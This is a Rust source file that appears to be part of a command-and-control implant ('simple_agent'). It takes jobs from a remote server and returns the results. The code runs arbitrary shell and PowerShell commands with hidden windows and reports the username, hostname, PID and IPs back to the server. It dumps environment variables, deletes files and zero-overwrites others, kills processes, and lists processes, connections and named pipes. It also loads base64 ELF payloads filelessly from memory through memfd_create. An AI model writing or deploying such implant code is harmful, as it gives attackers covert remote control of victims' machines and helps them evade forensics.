    fn run_cmd(&self, job: &Job) -> anyhow::Result<Job> {
        let (cmd, args) = extract_command(job);

        // "shell": run via system shell (supports built-ins, pipes, redirection)
        let (stdout, stderr) = if cmd == "shell" {
            exec::exec_shell(&args.join(" "))
        } else if cmd == "powershell" {
            exec::exec_powershell(&args.join(" "))
        } else {
            // Direct exec via WinAPI CreateProcess (CREATE_NO_WINDOW)
            exec::exec(&cmd, &args)
        };

        Ok(make_result(self.id, job, stdout, stderr))
    }

    fn build_agentinfo_result(&self, job: &Job) -> Job {
        let info = AgentInfo {
            version:    Some("0.1.0".into()),
            build:      Some("simple_agent".into()),
            waittime:   Some(format!("{}s", self.sleep.as_secs())),
            paddingmax: Some(self.padding_max as i32),
            maxretry:   Some(self.max_retry as i32),
            proto:      Some("https".into()),
            sysinfo:    Some(SysInfo {
                platform:     Some(std::env::consts::OS.to_string()),
                architecture: Some(std::env::consts::ARCH.to_string()),
                username:     username(),
                hostname:     hostname(),
                pid:          Some(process::id() as i32),
                ips:          local_ips(),
            }),
        };
        Job {
            agent_id: self.id,
            id:       job.id.clone(),
            token:    job.token,
            job_type: JOB_AGENTINFO,
            payload:  serde_json::to_value(&info).ok(),
        }
    }
}

// ── Native command implementations ────────────────────────────────────────────

/// Execute a JOB_NATIVE command and return the result string.
fn native_cmd(cmd: &str, args: &[String]) -> anyhow::Result<String> {
    match cmd {
        "cd" => {
            let path = args.first().map(String::as_str).unwrap_or(".");
            std::env::set_current_dir(path)?;
            Ok(std::env::current_dir()?.display().to_string())
        }

        "pwd" => Ok(std::env::current_dir()?.display().to_string()),

        "ls" => {
            let path = args.first().map(String::as_str).unwrap_or(".");
            let mut entries = Vec::new();
            for entry in std::fs::read_dir(path)? {
                let e    = entry?;
                let meta = e.metadata()?;
                let kind = if meta.is_dir() { "d" } else if meta.is_symlink() { "l" } else { "f" };
                let mtime = meta.modified()
                    .ok()
                    .and_then(|t| t.duration_since(std::time::UNIX_EPOCH).ok())
                    .map(|d| d.as_secs())
                    .unwrap_or(0);
                entries.push(serde_json::json!({
                    "name": e.file_name().to_string_lossy(),
                    "type": kind,
                    "size": meta.len(),
                    "modified": mtime,
                }));
            }
            Ok(serde_json::to_string(&entries)?)
        }

        "env" => {
            if args.is_empty() {
                // List all environment variables
                let mut out = String::new();
                let mut pairs: Vec<(String, String)> = std::env::vars().collect();
                pairs.sort_by(|a, b| a.0.cmp(&b.0));
                for (k, v) in pairs {
                    out.push_str(&format!("{}={}\n", k, v));
                }
                Ok(out)
            } else if args.len() >= 2 {
                std::env::set_var(&args[0], &args[1]);
                Ok(format!("{}={}", args[0], args[1]))
            } else {
                Ok(std::env::var(&args[0])
                    .unwrap_or_else(|_| format!("{}: not set", args[0])))
            }
        }

        "rm" => {
            let path = args.first()
                .ok_or_else(|| anyhow::anyhow!("rm: path required"))?;
            let meta = std::fs::metadata(path)?;
            if meta.is_dir() {
                std::fs::remove_dir_all(path)?;
            } else {
                std::fs::remove_file(path)?;
            }
            Ok(format!("removed {}", path))
        }

        "touch" => {
            let path = args.first()
                .ok_or_else(|| anyhow::anyhow!("touch: path required"))?;
            std::fs::OpenOptions::new()
                .create(true).write(true).open(path)?;
            Ok(format!("touched {}", path))
        }

        "sdelete" => {
            // Secure delete: overwrite with zeros then remove.
            let path = args.first()
                .ok_or_else(|| anyhow::anyhow!("sdelete: path required"))?;
            let meta = std::fs::metadata(path)?;
            if meta.is_file() {
                let zeros = vec![0u8; meta.len() as usize];
                std::fs::write(path, &zeros)?;
                std::fs::remove_file(path)?;
            }
            Ok(format!("securely deleted {}", path))
        }

        "killprocess" => {
            let pid_s = args.first()
                .ok_or_else(|| anyhow::anyhow!("killprocess: PID required"))?;
            let pid: u32 = pid_s.parse()?;
            kill_process(pid)
        }

        "ifconfig" | "ipconfig" => {
            // Delegate to the platform's network info tool.
            let (prog, prog_args): (&str, &[&str]) = if cfg!(windows) {
                ("ipconfig", &["/all"])
            } else {
                ("ip", &["addr"])
            };
            let out = std::process::Command::new(prog)
                .args(prog_args)
                .output()
                .or_else(|_| {
                    // fallback: ifconfig on systems without ip
                    std::process::Command::new("ifconfig").output()
                })?;
            Ok(String::from_utf8_lossy(&out.stdout).to_string()
                + &String::from_utf8_lossy(&out.stderr))
        }

        "nslookup" => {
            let host = args.first()
                .ok_or_else(|| anyhow::anyhow!("nslookup: hostname required"))?;
            // Use std DNS resolution — avoids any DNS library dependency.
            let addrs: Vec<_> = std::net::ToSocketAddrs::to_socket_addrs(
                &format!("{}:0", host).as_str()
            )?.collect();
            if addrs.is_empty() {
                return Ok(format!("nslookup: no addresses found for {}", host));
            }
            let mut out = format!("Host: {}\n", host);
            for addr in addrs {
                out.push_str(&format!("  {}\n", addr.ip()));
            }
            Ok(out)
        }

        _ => simple_agent::commands::dispatch(cmd, args),
    }
}

/// Kill a process by PID using WinAPI exec (CREATE_NO_WINDOW).
fn kill_process(pid: u32) -> anyhow::Result<String> {
    let pid_str = pid.to_string();
    if cfg!(windows) {
        let (stdout, stderr) = exec::exec("taskkill", &["/PID".to_string(), pid_str, "/F".to_string()]);
        if stderr.is_empty() {
            Ok(stdout)
        } else {
            anyhow::bail!("taskkill PID {}: {}", pid, stderr.trim())
        }
    } else {
        let (stdout, stderr) = exec::exec("kill", &["-9".to_string(), pid_str]);
        if stderr.is_empty() {
            Ok(if stdout.is_empty() { format!("killed PID {}", pid) } else { stdout })
        } else {
            anyhow::bail!("kill -9 {}: {}", pid, stderr.trim())
        }
    }
}

// ── Module command implementations ────────────────────────────────────────────

/// Execute a JOB_MODULE command and return the result string.
fn module_cmd(cmd: &str, args: &[String]) -> anyhow::Result<String> {
    let _args = args; // keep backward compat for existing match arms
    match cmd {
        "ps" => {
            if cfg!(windows) {
                // Use wmic to get PPID for process tree view
                let out = std::process::Command::new("wmic")
                    .args(&["process", "get", "ProcessId,ParentProcessId,Name,SessionId", "/format:csv"])
                    .output()?;
                let raw = String::from_utf8_lossy(&out.stdout);
                let lines: Vec<&str> = raw.lines().filter(|l| !l.trim().is_empty()).collect();

                if lines.len() > 1 {
                    // CSV header: Node,Name,ParentProcessId,ProcessId,SessionId
                    let mut procs = Vec::new();
                    for line in &lines[1..] {
                        let cols: Vec<&str> = line.split(',').collect();
                        if cols.len() >= 5 {
                            procs.push(serde_json::json!({
                                "name": cols[1].trim(),
                                "ppid": cols[2].trim().parse::<u32>().unwrap_or(0),
                                "pid": cols[3].trim().parse::<u32>().unwrap_or(0),
                                "session_id": cols[4].trim().parse::<u32>().unwrap_or(0),
                            }));
                        }
                    }
                    Ok(serde_json::to_string(&procs)?)
                } else {
                    // Fallback to tasklist
                    let out2 = std::process::Command::new("tasklist")
                        .args(&["/fo", "csv"])
                        .output()?;
                    let raw2 = String::from_utf8_lossy(&out2.stdout);
                    Ok(raw2.to_string())
                }
            } else {
                let out = std::process::Command::new("ps")
                    .args(&["aux"])
                    .output()?;
                Ok(String::from_utf8_lossy(&out.stdout).to_string())
            }
        }

        "netstat" => {
            let out = std::process::Command::new("netstat")
                .args(&["-an"])
                .output()?;
            Ok(String::from_utf8_lossy(&out.stdout).to_string())
        }

        "uptime" => {
            #[cfg(target_os = "linux")]
            {
                let content = std::fs::read_to_string("/proc/uptime")?;
                let secs: f64 = content.split_whitespace()
                    .next()
                    .and_then(|s| s.parse().ok())
                    .unwrap_or(0.0);
                let days    = (secs / 86400.0) as u64;
                let hours   = ((secs % 86400.0) / 3600.0) as u64;
                let minutes = ((secs % 3600.0) / 60.0) as u64;
                Ok(format!("up {} days, {:02}h {:02}m", days, hours, minutes))
            }
            #[cfg(not(target_os = "linux"))]
            {
                // Fallback: invoke uptime/wmic
                let out = if cfg!(windows) {
                    std::process::Command::new("cmd")
                        .args(&["/C", "wmic os get lastbootuptime /value"])
                        .output()?
                } else {
                    std::process::Command::new("uptime").output()?
                };
                Ok(String::from_utf8_lossy(&out.stdout).to_string())
            }
        }

        "memory" => {
            #[cfg(target_os = "linux")]
            {
                Ok(std::fs::read_to_string("/proc/meminfo")?)
            }
            #[cfg(not(target_os = "linux"))]
            {
                let out = if cfg!(windows) {
                    std::process::Command::new("cmd")
                        .args(&["/C", "wmic OS get FreePhysicalMemory,TotalVisibleMemorySize /value"])
                        .output()?
                } else {
                    std::process::Command::new("vm_stat").output()?
                };
                Ok(String::from_utf8_lossy(&out.stdout).to_string())
            }
        }

        // Linux memfd: create an anonymous in-memory file, write data to it,
        // then execute it.  args[0] = base64-encoded ELF binary.
        "memfd" => {
            #[cfg(target_os = "linux")]
            {
                use base64::Engine as _;
                let b64 = _args.first()
                    .ok_or_else(|| anyhow::anyhow!("memfd: binary data required (base64)"))?;
                let binary = base64::engine::general_purpose::STANDARD.decode(b64)?;

                // Create anonymous file (Linux 3.17+)
                let fd = unsafe {
                    libc::syscall(
                        libc::SYS_memfd_create,
                        b".\0".as_ptr(),
                        0u32,
                    ) as i32
                };
                if fd < 0 {
                    anyhow::bail!("memfd_create failed: errno {}", fd);
                }

                // Write the binary
                use std::os::unix::io::FromRawFd;
                let mut file = unsafe { std::fs::File::from_raw_fd(fd) };
                std::io::Write::write_all(&mut file, &binary)?;

                // Execute via /proc/self/fd/<fd>
                let fd_path = format!("/proc/self/fd/{}", fd);
                let extra_args: Vec<&str> = args[1..].iter().map(String::as_str).collect();
                let out = std::process::Command::new(&fd_path)
                    .args(&extra_args)
                    .output()?;
                Ok(String::from_utf8_lossy(&out.stdout).to_string()
                    + &String::from_utf8_lossy(&out.stderr))
            }
            #[cfg(not(target_os = "linux"))]
            anyhow::bail!("memfd: Linux only")
        }

        // Named pipe enumeration (Windows) / FIFO listing (Linux).
        "pipes" => {
            #[cfg(windows)]
            {
                use std::ffi::OsString;
                use std::os::windows::ffi::OsStringExt;

                #[repr(C)]
                #[allow(non_snake_case)]
                struct WIN32_FIND_DATAW {
                    dwFileAttributes: u32,
                    ftCreationTime: [u32; 2],
                    ftLastAccessTime: [u32; 2],
                    ftLastWriteTime: [u32; 2],
                    nFileSizeHigh: u32,
                    nFileSizeLow: u32,
                    dwReserved0: u32,
                    dwReserved1: u32,
                    cFileName: [u16; 260],
                    cAlternateFileName: [u16; 14],
                }

                extern "system" {
                    fn FindFirstFileW(lpFileName: *const u16, lpFindFileData: *mut WIN32_FIND_DATAW) -> isize;
                    fn FindNextFileW(hFindFile: isize, lpFindFileData: *mut WIN32_FIND_DATAW) -> i32;
                    fn FindClose(hFindFile: isize) -> i32;
                }

                const INVALID_HANDLE_VALUE: isize = -1;

                // The search pattern for named pipes
                let pattern: Vec<u16> = r"\\.\pipe\*"
                    .encode_utf16()
                    .chain(std::iter::once(0))
                    .collect();

                let mut fd: WIN32_FIND_DATAW = unsafe { std::mem::zeroed() };
                let handle = unsafe { FindFirstFileW(pattern.as_ptr(), &mut fd) };
                if handle == INVALID_HANDLE_VALUE {
                    anyhow::bail!("FindFirstFileW failed for \\\\.\\pipe\\*");
                }

                let mut names = Vec::new();
                loop {
                    let len = fd.cFileName.iter().position(|&c| c == 0).unwrap_or(260);
                    let name = OsString::from_wide(&fd.cFileName[..len]);
                    names.push(name.to_string_lossy().into_owned());
                    if unsafe { FindNextFileW(handle, &mut fd) } == 0 {
                        break;
                    }
                }
                unsafe { FindClose(handle); }

                Ok(names.join("\n"))
            }
            #[cfg(not(windows))]
            {
                // Find FIFO files on the filesystem
                let out = std::process::Command::new("find")
                    .args(&["/tmp", "/run", "-type", "p", "-maxdepth", "3"])
                    .output()?;
                Ok(String::from_utf8_lossy(&out.stdout).to_string())
            }
        }

        _ => simple_agent::commands::dispatch(cmd, args),
    }
}

// ── Helpers ───────────────────────────────────────────────────────────────────

fn parse_jobs(payload: Option<Value>) -> anyhow::Result<Vec<Job>> {
    match payload {
        Some(v) => Ok(serde_json::from_value(v)?),
        None    => Ok(vec![]),
    }
}

fn extract_command(job: &Job) -> (String, Vec<String>) {
    if let Some(p) = &job.payload {
        if let Ok(cmd) = serde_json::from_value::<Command>(p.clone()) {
            return (cmd.command, cmd.args);
        }
    }
    (String::new(), vec![])
}

fn make_result(agent_id: Uuid, job: &Job, stdout: String, stderr: String) -> Job {
    Job {
        agent_id,
        id:       job.id.clone(),
        token:    job.token,
        job_type: JOB_RESULT,
        payload:  serde_json::to_value(Results { stdout, stderr }).ok(),
    }
}

fn random_padding(max: usize) -> String {
    let max = max.max(8);
    let n = rand::thread_rng().gen_range(8..=max);
    rand::thread_rng()
        .sample_iter(rand::distributions::Alphanumeric)
        .take(n)
        .map(char::from)
        .collect()
}

fn hostname() -> Option<String> {
    std::env::var("COMPUTERNAME")
        .or_else(|_| std::env::var("HOSTNAME"))
        .ok()
}

fn username() -> Option<String> {
    std::env::var("USER")
        .or_else(|_| std::env::var("USERNAME"))
        .ok()
}

/// Collect local IP addresses by resolving the local hostname.
fn local_ips() -> Option<Vec<String>> {
    let name = hostname()?;
    let addrs: Vec<String> = std::net::ToSocketAddrs::to_socket_addrs(
        &format!("{}:0", name).as_str()
    ).ok()?
     .map(|a| a.ip().to_string())
     .collect();
    if addrs.is_empty() { None } else { Some(addrs) }
}
